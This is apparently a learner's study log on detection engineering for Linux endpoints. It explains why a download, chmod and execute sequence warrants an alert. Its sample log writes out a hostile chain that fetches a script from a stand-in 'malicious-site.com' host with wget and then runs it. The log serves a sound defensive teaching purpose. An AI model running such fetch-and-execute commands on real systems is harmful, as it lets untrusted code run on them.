# Week 1 Day 6 - Detection Engineering for Endpoint and Behavior

This module captures my Week 1 Day 6 learning on detection engineering for endpoint activity and behavior-based detections.

## Day 6 Objective

Today I focused on moving beyond authentication events and looking at how suspicious activity can be detected directly on a system.

By the end of Day 6, I wanted to be able to:

- Explain what detection engineering means in a practical SOC context
- Identify suspicious command-line activity on a Linux endpoint
- Distinguish normal administrative behavior from risky behavior chains
- Build a sequence-based detection idea for malware download and execution
- Think in terms of attacker workflow, not just single events

## Concept in Practical Terms

Detection engineering is the process of designing logic that identifies malicious or high-risk behavior.

That means looking beyond simple events like failed logins and focusing on activity such as:

- Malware downloads
- Suspicious command execution
- Script execution chains
- Behavior patterns associated with attacker actions

One of the biggest ideas today was that attackers do not just log in.

They usually do something after access is gained.

That is why endpoint behavior matters.

## Scenario Review

### Example Linux command activity

```text
Mar 22 11:00:01 user cody executed: ls
Mar 22 11:00:05 user cody executed: cat notes.txt
Mar 22 11:00:10 user cody executed: sudo apt update
Mar 22 11:05:22 user cody executed: wget http://malicious-site.com/payload.sh
Mar 22 11:05:30 user cody executed: chmod +x payload.sh
Mar 22 11:05:35 user cody executed: ./payload.sh
```

## My Analysis

### 1. Commands that look normal

- `ls`
- `cat notes.txt`
- `sudo apt update`

These can all be part of normal system use or administrative activity.

### 2. Commands that look suspicious

- `wget http://malicious-site.com/payload.sh`
- `chmod +x payload.sh`
- `./payload.sh`

What makes these stand out is the behavior chain: download a file from an external source, make it executable, then run it.

### 3. Why `wget` matters

`wget` downloads a file from an external source, which can introduce an untrusted or malicious payload onto the system.

### 4. What `chmod +x` does

It changes the file permissions so the downloaded file can be executed as a program.

### 5. Why `./payload.sh` is dangerous

It executes a script that came from an external source, which could allow malware or attacker-controlled code to run on the system.

## Detection Thinking

### 6. What sequence I would alert on

I would alert on a short sequence where a file is downloaded, then made executable, and then executed.

That sequence suggests intent more clearly than any one command by itself.

### 7. Detection rule in plain English

> Alert if a file is downloaded using `wget`, followed by a permission change such as `chmod +x`, and then execution of that file within a short time window.

That wording is stronger than just saying a program was installed because it focuses on the exact behavior chain.

## Bonus Concept

This activity most likely represents:

- Initial malware execution

Reason:

- Code is brought onto the system
- The file is prepared for execution
- The payload is launched

That sequence looks more like attacker foothold activity than normal administration.

## Mini Challenge Reflection

Question:

- A: `wget file.sh`
- B: `wget file.sh -> chmod +x file.sh -> ./file.sh`

My final conclusion: B is more suspicious.

Reasoning:

- Option A is a single command and could still have a legitimate explanation
- Option B shows a complete behavior chain associated with payload delivery and execution
- A sequence of actions reveals intent more clearly than one isolated event

Key idea from this exercise:

- Single event detection can be noisy
- Behavior-chain detection is usually much stronger

## Key Terms

- Detection engineering: designing logic to identify malicious behavior
- Endpoint telemetry: activity recorded from a host or endpoint system
- Behavior chain: linked actions that together indicate malicious intent
- Payload: code or script delivered to perform an attacker objective
- Command execution: processes or shell commands run by a user or program
- Initial execution: the stage where malicious code first runs on a system

## My Takeaways

Day 6 helped me see the difference between watching events and identifying attacker behavior.

What clicked for me:

- A single command may not mean much by itself
- A command sequence provides much stronger detection value
- Downloading, modifying permissions, and executing a file is a meaningful behavior pattern
- Endpoint detections are really about understanding actions and intent

## Next Up

Week 1 Day 7 will focus on false positives and tuning, so I can better understand why noisy alerts happen and how to improve detection quality.